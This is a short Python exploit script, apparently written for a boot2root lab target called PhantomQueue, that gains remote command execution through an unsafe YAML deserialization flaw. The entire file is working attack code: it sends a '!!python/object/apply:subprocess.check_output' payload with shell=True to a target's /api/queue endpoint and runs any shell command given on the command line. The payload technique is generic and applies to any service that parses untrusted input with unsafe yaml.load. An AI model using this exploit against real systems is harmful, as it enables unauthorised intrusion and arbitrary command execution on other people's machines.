#!/usr/bin/env python3
"""RCE helper for boot2root-c2 PhantomQueue YAML deserialization bug.
POST /api/queue parses body with an unsafe yaml.load, allowing
!!python/object/apply:subprocess.check_output with shell=True.
Usage: python3 rce.py "<shell command>"
"""
import sys
import urllib.request

TARGET = "http://10.100.16.100:8080/api/queue"

def run(cmd: str) -> str:
    body = (
        "!!python/object/apply:subprocess.check_output\n"
        "args: [%r]\n"
        "kwds: {shell: true, stderr: -2}\n" % cmd
    )
    req = urllib.request.Request(
        TARGET, data=body.encode(), method="POST",
        headers={"Content-Type": "text/plain"},
    )
    with urllib.request.urlopen(req, timeout=15) as resp:
        return resp.read().decode(errors="replace")

if __name__ == "__main__":
    out = run(sys.argv[1])
    print(out)
